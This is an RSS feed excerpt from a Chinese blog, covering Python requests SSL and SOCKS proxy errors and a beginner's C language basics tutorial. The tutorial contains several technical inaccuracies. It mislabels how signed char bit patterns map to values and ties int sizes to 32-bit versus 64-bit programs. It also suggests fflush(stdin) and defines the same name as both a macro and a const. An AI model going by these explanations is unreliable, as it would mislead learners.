&lt;pre tabindex="0">&lt;code>requests.exceptions.SSLError: SOCKSHTTPSConnectionPool(host=&amp;#39;www.xxx.org&amp;#39;, port=443): Max retries exceeded with url: /file/ (Caused by SSLError(SSLError(&amp;#34;bad handshake: SysCallError(-1, &amp;#39;Unexpected EOF&amp;#39;)&amp;#34;)))
requests.exceptions.ConnectionError: SOCKSHTTPSConnectionPool(host=&amp;#39;www.xxx.org&amp;#39;, port=443): Max retries exceeded with url: /file/ (Caused by NewConnectionError(&amp;#39;&amp;lt;urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x0000021C585105C0&amp;gt;: Failed to establish a new connection: [Errno 11001] getaddrinfo failed&amp;#39;))
requests.exceptions.SSLError: HTTPSConnectionPool(host=&amp;#39;msft.com&amp;#39;, port=443): Max retries exceeded with url: / (Caused by SSLError(&amp;#34;Can&amp;#39;t connect to HTTPS URL because the SSL module is not available.&amp;#34;))
......
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>本文就来好好踩踩这些坑&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="ssl-module-is-not-available">SSL module is not available&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>出现如上错误表明程序未能正确加载引用ssl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是linux系统，linux系统使用源码编译出来的python在编译过程种没有设定编译ssl库，建议重新编译安装python。或者尝试通过pip安装openssl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是一个win下的conda用户，首先也可以尝试使用conda安装缺失的openssl库。&lt;/p>
&lt;ul>
&lt;li>如果openssl本来就已经存在了，但是代码还是出现如上报错，并且你是使用某些编辑器（列如vscode）编写python脚本的，可能是因为安装好的openssl由于缺少环境变量的支持无法被程序正确的调用，你可以通过配置环境变量，或者在conda的命令行里运行你编写的脚本&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="bad-handshake-syscallerror-1-unexpected-eof">bad handshake: SysCallError(-1, 'Unexpected EOF')&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这是最坑的一个错误&lt;/p>
&lt;/li>
&lt;li>
&lt;p>错误的握手包。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新版本的openssl将有漏洞的cipher禁用了，使用TSL1.0一下的cipher都无法匹配。这在新版本的requests中也是如此。
解决方法有人说是降低requests版本，还有一个方法是在代理服务器地址写成如下格式&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code># socks5h://127.0.0.1:1080
r=requests.get(URL,proxies={&amp;#34;https&amp;#34;:&amp;#34;socks5h://127.0.0.1:1080&amp;#34;})
&lt;/code>&lt;/pre>&lt;p>&lt;del>对就是加了个h&lt;/del>&lt;/p>
&lt;ul>
&lt;li>加h的含义：
&lt;pre tabindex="0">&lt;code>socks5h:// socks4a://
&lt;/code>&lt;/pre>表示主机名由socks服务器解析;
&lt;pre tabindex="0">&lt;code>socks5:// socks4://
&lt;/code>&lt;/pre>表示主机名在本地解析&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/python/">Python</category><category domain="https://yuukisama.cc/tags/%E7%88%AC%E8%99%AB/">爬虫</category></item><item><title>C语言基础精炼</title><link>https://yuukisama.cc/posts/code/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%B2%BE%E7%82%BC/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%B2%BE%E7%82%BC/</guid><pubDate>Sat, 30 Mar 2019 21:46:48 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="前言">前言：&lt;/h2>
&lt;ul>
&lt;li>这是一篇有关C语言语法基础的精炼概述性质文章，不会涉及C语言一些有深度的内容&lt;/li>
&lt;li>本文面向的是以大学C考试过关为目标，以计算机二级认证为目标，期望获得一个C语言最基础认识的读者&lt;/li>
&lt;li>博主能力有限，可能某些知识点未能讲解清晰，某些知识点遗漏，甚至某些知识点错误，若发现以上问题欢迎邮件勘误。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="start">Start&lt;/h2>
&lt;h2 id="c语言基本结构">C语言基本结构&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
/* 这是每个程序的开始 */
printf(&amp;#34;Hello World!\n&amp;#34;); //这是另一种注释方法
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>所有C语言程序都包含一个main()函数，程序从main()函数开始执行，每个函数用花括号“{}”包括。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言有两种添加注释方法&lt;/p>
&lt;ol>
&lt;li>以“//”开头的单行注释&lt;/li>
&lt;li>以“/**/”包裹的多行注释，或者叫块注释&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>stdio.h是一个头文件（标准输入输出头文件，这个头文件内包含printf函数的定义与实现，如果没有找到stdio.h，printf函数会出现编译错误）。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>#include 是一个预处理命令（c语言中以#开头的命令称为预处理命令，类似还有#define）用来引入头文件。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>return 0; 用于退出程序，并向操作系统返回一个数值0.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一句完整的c语言代码用分号“;”（&lt;strong>英文小写&lt;/strong>）作为结束符号&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="c语言简介">C语言简介&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">百度百科&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">维基百科&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>重点&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>C语言是一门&lt;strong>面向过程&lt;/strong>的&lt;strong>高级语言&lt;/strong>&lt;/li>
&lt;li>C语言仍然保持跨平台特性&lt;/li>
&lt;li>未完待续。。。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="编写环境">编写环境&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这里仅为初学者，没有开发项目需求的读者推荐以下开发软件&lt;/p>
&lt;/li>
&lt;li>
&lt;p>软件名称超链接对应的软件的基本操作入门，Download超链接为下载地址。这里提供的软件下载地址部分是国外网站，如果无法打开可以百度软件名下载&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">软件&lt;/th>
&lt;th style="text-align:center">简介&lt;/th>
&lt;th style="text-align:center">链接&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="https://blog.csdn.net/C20180630/article/details/53185725">Dev C++&lt;/a>&lt;/td>
&lt;td style="text-align:center">个人觉得最适合新手的集成开发环境，同时具有简单项目的开发能力。傻瓜式安装即点即用&lt;br/>同时支持中文，缺点大概是无法跨平台（需要跨平台的也就不是新手了）&lt;/td>
&lt;td style="text-align:center">&lt;a href="https://sourceforge.net/projects/orwelldevcpp/">Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="http://www.dotcpp.com/wp/818.html">Code Blocks&lt;/a>&lt;/td>
&lt;td style="text-align:center">很多文章鼓吹的集成开发环境，博主本人没有使用过，但是口碑一直不错。&lt;br/>作为一款开源软件同时支持跨平台就是其优点&lt;/td>
&lt;td style="text-align:center">&lt;a href="https://sourceforge.net/projects/codeblocks/">Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="http://c.biancheng.net/cpp/html/2888.html">Visual C++ 6.0&lt;/a>&lt;/td>
&lt;td style="text-align:center">微软老牌集成开发环境，&lt;del>个人感觉几近过时&lt;/del>是前计算机二级指定开发环境&lt;br/>除非是学习单片机开发的，或者熟悉二级考试环境，不建议使用&lt;/td>
&lt;td style="text-align:center">&lt;a href="http://c.biancheng.net/cpp/html/1117.html">Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="http://c.biancheng.net/cpp/html/3384.html">Visual Studio 2010&lt;/a>&lt;/td>
&lt;td style="text-align:center">微软集成开发环境，全国计算机二级新标准指定的软件&lt;/td>
&lt;td style="text-align:center">&lt;a href="http://c.biancheng.net/cpp/html/3383.html">Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">Visual Studio (latest)&lt;/td>
&lt;td style="text-align:center">不是很推荐新手使用最新版的Visual Studio，&lt;br/>微软最新的vs对诸多c++语法做了安全方面的限制&lt;/td>
&lt;td style="text-align:center">No Download&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="基本数据类型">基本数据类型&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>在了解基本数据类型之前我们需要对计算机存储空间单位换算有个基本概念&lt;/p>
&lt;ul>
&lt;li>最小单位bit（位）：即一个二进制位&lt;/li>
&lt;li>Byte（字节）：1 Byte=8 bit&lt;/li>
&lt;li>KB（千字节）：1 KB=1024 Byte&lt;/li>
&lt;li>MB（兆字节）：1 MB=1024 KB&lt;/li>
&lt;li>GB（吉字节）：1 GB=1024 MB&lt;/li>
&lt;li>TB（太字节）：1 TB=1024 GB&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://zhidao.baidu.com/question/6318898">更多相关资料链接&lt;/a>&lt;/p>
&lt;hr>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="整数类型">整数类型&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">类型&lt;/th>
&lt;th style="text-align:left">存储大小&lt;/th>
&lt;th style="text-align:left">取值范围&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">1 byte&lt;/td>
&lt;td style="text-align:left">-2^7~2^7-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">2 byte（32bit）&lt;br/>4 Byte（64bit）&lt;/td>
&lt;td style="text-align:left">-2^15~2^15-1 &lt;br/>-2^31~2^31-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">2 byte&lt;/td>
&lt;td style="text-align:left">-2^15~2^15-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">4 byte&lt;/td>
&lt;td style="text-align:left">-2^31~2^31-1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>int型在32位程序和64位程序中所能表示的范围是不一样的，所以表中会有两个范围.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重点:&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>结合之前对存储单位的科普。我们知道1 Byte=8bit即1字节等于8个比特位。计算机内部其实只认识1和0，也就是二进制。所以计算机对任何数据的处理都是转换成对应的二进制。1字节对应8个二进制位即：&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000 -- 11111111
&lt;/code>&lt;/pre>&lt;p>用8个位子随意组合摆放0，1可以由2^8种组合，计算机内部将这2^8种组合在一一映射到实际的数值上。列如：&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000 --&amp;gt; -2^7=-128
00000001 --&amp;gt; -2^7+1=-127
···
10000000 --&amp;gt; 0
10000001 --&amp;gt; 1
···
11111111 --&amp;gt; 2^7-1=127
&lt;/code>&lt;/pre>&lt;p>所以我们就有了&lt;/p>
&lt;pre tabindex="0">&lt;code>char 1 Byte（字节）范围 -2^7~2^7 即 -128~127
&lt;/code>&lt;/pre>&lt;p>其他类型也可以同样的方法计算范围。也正如表中所给的数值范围，全部以2的次幂记忆。如:&lt;/p>
&lt;pre tabindex="0">&lt;code>int 在64位下 大小为4Byte（字节）
4 Byte=4*8 bit=32bit
也就是32个二进制bit位
所以int型的范围可以表示为
-2^31~2^31-1
（有没有奇怪为森魔要-1？因为数字0的存在）
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>unsigned &amp;amp; signed&lt;/li>
&lt;/ul>
&lt;p>值得一提的是c语言种对基本数据类型还有两个修饰符可以使用：&lt;/p>
&lt;pre tabindex="0">&lt;code>unsigned 中文释义：无符号
signed 中文释义：有符号
&lt;/code>&lt;/pre>&lt;p>顾名思义，举例来说，如果我们使用unsigned修饰int型&lt;/p>
&lt;pre tabindex="0">&lt;code>unsigned char x;
/* 如此声明的这个变量x的取值范围就会变成 0~2^8-1 即 0-255 */
&lt;/code>&lt;/pre>&lt;p>而signed有符号，以上常用数据类型默认都是由signed（有符号修饰的）所以他们的范围从负数开始，如果你加上unsigned（无符号）那么所有的数据类型范围将是从0开始&lt;/p>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="浮点类型">浮点类型&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">类型&lt;/th>
&lt;th style="text-align:left">存储大小&lt;/th>
&lt;th style="text-align:left">取值范围&lt;/th>
&lt;th style="text-align:left">精度&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">4 Byte&lt;/td>
&lt;td style="text-align:left">1.2E-38 ~ 3.4E+38&lt;/td>
&lt;td style="text-align:left">6位小数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">8 Byte&lt;/td>
&lt;td style="text-align:left">2.3E-308 ~ 1.7E+308&lt;/td>
&lt;td style="text-align:left">15位小数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long double&lt;/td>
&lt;td style="text-align:left">16 Byte&lt;/td>
&lt;td style="text-align:left">3.4E-4932 ~ 1.1E+4932&lt;/td>
&lt;td style="text-align:left">19位小数&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>有关浮点型的相关问题属于较有深度的问题，这里不做探究&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="void类型">void类型&lt;/h3>
&lt;p>void类型呢是一个比较特殊的类型。&lt;/p>
&lt;ul>
&lt;li>用来修饰函数表明函数返回值位空，即不存在返回值&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
void main(){
printf(&amp;#34;hello world&amp;#34;);
return;
}
/*
还记得return吗，用于结束函数并向操作系统或者上级调用函数返回一个数值。如果这个函数是用void修饰的，列如这里的main()函数，这里return就不必返回一个数值（如果你还是写作return 0;还会报错）
*/
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>用来修饰函数参数表明该函数不接受参数&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int func(void){
printf(&amp;#34;hallo world&amp;#34;);
return 0;
}
int main(){
func();
return 0;
}
//其实默认括号内为空就表示没有参数，即void是可以省略的
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>用来修饰指针代表对象地址，而不是一个类型。（关于指针会在指针部分详解）&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="常量">常量&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>常量，是写死在程序里，在程序运行过程中不可更改的量&lt;/p>
&lt;/li>
&lt;li>
&lt;p>定义方法&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//所有基本数据类型均可以定义对应常量
#define N 100
#define Good true
#define x 1.2345
#define newline &amp;#39;\n&amp;#39;
//你也可以使用那个const关键字定义常量
const double x=0.123456;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="基本输入输出语句">基本输入输出语句&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int i; //声明整形变量i
int x,y; //声明整形变量x，y
float a;
double b;
char ch; //声明字符变量ch
scanf(&amp;#34;%d&amp;#34;,&amp;amp;i); //从键盘输入数字i
scanf(&amp;#34;%d %d&amp;#34;,&amp;amp;x,&amp;amp;y); //从键盘同时输入数字x,y
scanf(&amp;#34;%f %lf&amp;#34;,&amp;amp;a,&amp;amp;b);
scanf(&amp;#34;%c&amp;#34;,&amp;amp;ch); //从键盘读入一个字符ch
printf(&amp;#34;hallo world\n&amp;#34;); //打印固定字符串
printf(&amp;#34;%d\n&amp;#34;,i); //打印单个数字
printf(&amp;#34;你输入的x=%d,y=%d\n&amp;#34;,x,y);//格式化输出
printf(&amp;#34;单精度a=%f;双精度b=%.3lf&amp;#34;,a,b);//打印输出浮点类型，并限制位数
printf(&amp;#34;%c&amp;#34;,ch);//打印单个字符
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>以下是样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>10
2 3
1.234 3.141592654
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>以下是输出&lt;/p>
&lt;pre tabindex="0">&lt;code>hallo world
10
你输入的x=2,y=3
单精度a=1.234000;双精度b=3.142
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>你可能会奇怪不是应该还输入一个单个字符吗，为什么没有了，其实那个单个字符就是两个小数最后的回车符所以你也看到了我的输出其实多了一行，对那就是那个最后输入的回车符。&lt;/li>
&lt;li>&amp;quot;%.3f&amp;quot;这个写法是限制小数后打印三位，默认四舍五入&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>请努力理解以上代码，结合下方给出的资料&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>格式输出符号&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">格式输出符号&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">%a&lt;/td>
&lt;td style="text-align:left">浮点数、十六进制数字和p-记数法（c99&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%A&lt;/td>
&lt;td style="text-align:left">浮点数、十六进制数字和p-记法（c99）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%c&lt;/td>
&lt;td style="text-align:left">一个字符(char)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%C&lt;/td>
&lt;td style="text-align:left">一个ISO宽字符&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%d&lt;/td>
&lt;td style="text-align:left">有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%e&lt;/td>
&lt;td style="text-align:left">浮点数、e-记数法&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%E&lt;/td>
&lt;td style="text-align:left">浮点数、E-记数法&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%f&lt;/td>
&lt;td style="text-align:left">单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%g&lt;/td>
&lt;td style="text-align:left">根据数值不同自动选择%f或%e．&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%G&lt;/td>
&lt;td style="text-align:left">根据数值不同自动选择%f或%e.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%i&lt;/td>
&lt;td style="text-align:left">有符号十进制数（与%d相同）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%o&lt;/td>
&lt;td style="text-align:left">无符号八进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%p&lt;/td>
&lt;td style="text-align:left">指针&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%s&lt;/td>
&lt;td style="text-align:left">对应字符串char*（%s = %hs = %hS 输出 窄字符）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%S&lt;/td>
&lt;td style="text-align:left">对应宽字符串WCAHR*（%ws = %S 输出宽字符串）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%u&lt;/td>
&lt;td style="text-align:left">无符号十进制整数(unsigned int)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%x&lt;/td>
&lt;td style="text-align:left">使用十六进制数字0xf的无符号十六进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%X&lt;/td>
&lt;td style="text-align:left">使用十六进制数字0xf的无符号十六进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%%&lt;/td>
&lt;td style="text-align:left">打印一个百分号&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64d&lt;/td>
&lt;td style="text-align:left">用于INT64 或者 long long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64u&lt;/td>
&lt;td style="text-align:left">用于UINT64 或者 unsigned long long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64x&lt;/td>
&lt;td style="text-align:left">用于64位16进制数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>基本常用的就是整数，小数，字符，字符串的输出。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>转义字符&lt;/p>
&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">转义字符&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;th style="text-align:left">ASCII码值&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">\a&lt;/td>
&lt;td style="text-align:left">响铃(BEL)&lt;/td>
&lt;td style="text-align:left">007&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\b&lt;/td>
&lt;td style="text-align:left">退格(BS) ，将当前位置移到前一列&lt;/td>
&lt;td style="text-align:left">008&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\f&lt;/td>
&lt;td style="text-align:left">换页(FF)，将当前位置移到下页开头&lt;/td>
&lt;td style="text-align:left">012&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\n&lt;/td>
&lt;td style="text-align:left">换行(LF) ，将当前位置移到下一行开头&lt;/td>
&lt;td style="text-align:left">010&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\r&lt;/td>
&lt;td style="text-align:left">回车(CR) ，将当前位置移到本行开头&lt;/td>
&lt;td style="text-align:left">013&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\t&lt;/td>
&lt;td style="text-align:left">水平制表(HT) （跳到下一个TAB位置）&lt;/td>
&lt;td style="text-align:left">009&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\v&lt;/td>
&lt;td style="text-align:left">垂直制表(VT)&lt;/td>
&lt;td style="text-align:left">011&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\\&lt;/td>
&lt;td style="text-align:left">代表一个反斜线字符'''&lt;/td>
&lt;td style="text-align:left">092 ​&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">'&lt;/td>
&lt;td style="text-align:left">代表一个单引号（撇号）字符&lt;/td>
&lt;td style="text-align:left">039&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;quot;&lt;/td>
&lt;td style="text-align:left">代表一个双引号字符&lt;/td>
&lt;td style="text-align:left">034&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\0&lt;/td>
&lt;td style="text-align:left">空字符(NULL)&lt;/td>
&lt;td style="text-align:left">000&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\ddd&lt;/td>
&lt;td style="text-align:left">1到3位八进制数所代表的任意字符&lt;/td>
&lt;td style="text-align:left">三位八进制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\xhh&lt;/td>
&lt;td style="text-align:left">1到2位十六进制所代表的任意字符&lt;/td>
&lt;td style="text-align:left">二位十六进制&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>难点&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>scanf()函数，以空格或者回车符作为截断。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言中的输入输出缓冲区机制&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在C/C++中，输入输出事实上是各自有一个缓冲区的。缓冲区故名思意。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在你的键盘，屏幕和程序实际获得输入之间还有一个缓冲区。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你按下的按键会被先存放到缓冲区内，接着程序从&lt;strong>输入缓冲区&lt;/strong>读取。处理完毕之后将输出写在&lt;strong>输出缓冲区&lt;/strong>内，屏幕再从输出缓冲区内读取输出并显示给你。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>并不是你想象中的你按下的每一个字符都会直接被程序接收&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当再输入的时候涉及到了字符，或者字符串，并且你发现输入的数据并没有按照你的需要，按照你所想的进行，多半是因为在输入缓冲区内有你之前输入操作时遗留的字符在里面（简单举例，你使用scanf输入一个数字并且按下回车，数字被程序从输入缓冲区读取，但是遗留下来了一个回车符，如果你紧接着读取一个字符，就会出现你意料之外的情况，也就是上述输入输出示例代码中的情况。）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当输入缓冲区出现问题时可以使用如下代码清除缓冲区：&lt;/p>
&lt;pre tabindex="0">&lt;code>fflush(stdin);
&lt;/code>&lt;/pre>&lt;p>&lt;del>然而并不是所有的编译器支持这个函数&lt;/del>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="运算符">运算符&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="算术运算符">算术运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;th style="text-align:left">实列&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">+&lt;/td>
&lt;td style="text-align:left">把两个操作数相加&lt;/td>
&lt;td style="text-align:left">A + B 将得到 30&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">-&lt;/td>
&lt;td style="text-align:left">从第一个操作数中减去第二个操作数&lt;/td>
&lt;td style="text-align:left">A - B 将得到 -10&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">*&lt;/td>
&lt;td style="text-align:left">把两个操作数相乘&lt;/td>
&lt;td style="text-align:left">A * B 将得到 200&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">/&lt;/td>
&lt;td style="text-align:left">分子除以分母&lt;/td>
&lt;td style="text-align:left">B / A 将得到 2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%&lt;/td>
&lt;td style="text-align:left">取模运算符，整除后的余数&lt;/td>
&lt;td style="text-align:left">B % A 将得到 0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">++&lt;/td>
&lt;td style="text-align:left">自增运算符，整数值增加 1&lt;/td>
&lt;td style="text-align:left">A++ 将得到 11&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">--&lt;/td>
&lt;td style="text-align:left">自减运算符，整数值减少 1&lt;/td>
&lt;td style="text-align:left">A-- 将得到 9&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>重点&lt;/li>
&lt;/ul>
&lt;p>自增自减运算符的理解&lt;/p>
&lt;ul>
&lt;li>自增自减少运算符仅支持整数类型&lt;/li>
&lt;li>逻辑关系
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int x=0;
printf(&amp;#34;%d\n&amp;#34;,x++);
printf(&amp;#34;%d\n&amp;#34;,x);
printf(&amp;#34;%d\n&amp;#34;,--x);
printf(&amp;#34;%d\n&amp;#34;,x);
return 0;
}
&lt;/code>&lt;/pre>样例输出
&lt;pre tabindex="0">&lt;code>0
1
0
0
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>当这两个运算符出现在程序语句中时&lt;/li>
&lt;li>如果位于变量前，则先执行自增（或自减）再执行程序语句&lt;/li>
&lt;li>如果位于变量之后，则先执行程序语句，再进行自增（或自减）&lt;/li>
&lt;/ul>
&lt;p>除此之外c语言还支持如下的写法简化：&lt;/p>
&lt;pre tabindex="0">&lt;code>i=i+1; 可以写作 i+=1;
i=i*10; 可以写作 i*=10;
i=i/2; 可以写作 i/=2;
